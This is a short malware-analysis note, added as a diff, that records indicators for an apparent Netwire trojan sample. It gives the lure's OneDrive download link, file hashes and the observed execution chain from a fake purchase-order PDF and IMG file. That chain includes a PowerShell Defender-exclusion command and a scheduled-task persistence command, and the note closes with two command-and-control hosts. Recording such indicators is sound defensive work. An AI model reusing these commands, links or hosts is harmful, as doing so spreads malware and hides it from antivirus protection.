@@ -1,0 +1,56 @@
+Netwire | 22.04.2022 | Version 1.2.2.0
+
+************************************************************************************************************
+
+https://onedrive.live.com/download?cid=3AC522790405B312&resid=3AC522790405B312%21179&authkey=AKf_v72zOcHJ6d4
+
+.pdf b3627a477cf891fdcd72b207521c18f30370aa9529557d1e709c6ea4b54de40f
+.img 3ff71627a708bf44e55cbdbabcd86dfaa631ae040466d7dfb6cda0fa2afe41d9
+.exe 6556bd37ac00c8f0572f458828376e56469268fb5e1e38a60569148f54123612
+
+************************************************************************************************************
+
+Exec >>
+
+AcroRd32.exe C:\Users\Admin\AppData\Local\Temp\NEW PURCHASE ORDER.pdf
+
+"C:\Program Files\Internet Explorer\iexplore.exe" https://onedrive.live.com/download?cid=3AC522790405B312&resid=3AC522790405B312%21179&authkey=AKf_v72zOcHJ6d4
+
+IEXPLORE.EXE SCODEF:1636 CREDAT:275457 /prefetch:2
+
+isoburn.exe C:\Users\Admin\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\BA88FKHT\20220421_NEW_PURCHASE_ORDER.IMG
+
+iexplore.exe https://onedrive.live.com/download?cid=3AC522790405B312&resid=3AC522790405B312%21179&authkey=AKf_v72zOcHJ6d4
+
+IEXPLORE.EXE SCODEF:2004 CREDAT:275457 /prefetch:2
+
+isoburn.exe" "C:\Users\Admin\Downloads\20220421_NEW_PURCHASE_ORDER.IMG"
+
+7zFM.exe C:\Users\Admin\Downloads\20220421_NEW_PURCHASE_ORDER.IMG
+
+C:\Users\Admin\AppData\Local\Temp\7zO8E70BEFC\20220421_NEWPURCHASE_ORDER.exe
+
+powershell.exe" Add-MpPreference -ExclusionPath "C:\Users\Admin\AppData\Roaming\AhtgFlFhkv.exe
+
+schtasks.exe /Create /TN "Updates\AhtgFlFhkv" /XML "C:\Users\Admin\AppData\Local\Temp\tmpCF70.tmp
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
+
+C:\Users\Admin\AppData\Local\Temp\7zO8E78392D\20220421_NEWPURCHASE_ORDER.exe 
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath C:\Users\Admin\AppData\Roaming\AhtgFlFhkv.exe
+
+C:\Windows\System32\schtasks.exe" /Create /TN "Updates\AhtgFlFhkv" /XML "C:\Users\Admin\AppData\Local\Temp\tmp1D80.tmp
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
+
+C:\Users\Admin\AppData\Local\Temp\7zO8E7E166D\20220421_NEWPURCHASE_ORDER.exe
+
+C:\Users\Admin\Downloads\20220421_NEWPURCHASE_ORDER.exe
+
+************************************************************************************************************
+
+c2'
+
+uhie.hopto.org:3994
+uhie.hopto.org:3918
